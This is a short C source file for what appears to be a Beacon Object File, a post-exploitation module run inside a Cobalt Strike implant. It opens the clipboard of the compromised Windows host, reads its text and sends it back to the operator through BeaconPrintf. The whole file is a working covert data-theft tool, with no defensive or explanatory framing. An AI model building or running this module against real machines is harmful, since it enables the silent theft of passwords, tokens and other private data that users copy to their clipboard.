
#include "bofdefs.h"
#include "base.c"
#include <string.h>
#include <winuser.h>


void Clipboard(){
    HWND owner = KERNEL32$GetConsoleWindow(); 
    USER32$OpenClipboard(owner);
    owner = USER32$GetClipboardData(CF_TEXT);
    BeaconPrintf(CALLBACK_OUTPUT, "%s\n", (char *)owner);;
    USER32$CloseClipboard();
}

#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length) 
{
	if(!bofstart())
	{
		return;
	}
	//CALLYOURFUNCHERE
	Clipboard();
	printoutput(TRUE);
};

#else

int main()
{
	Clipboard();
	return 0;
//code for standalone exe for scanbuild / leak checks
}

#endif
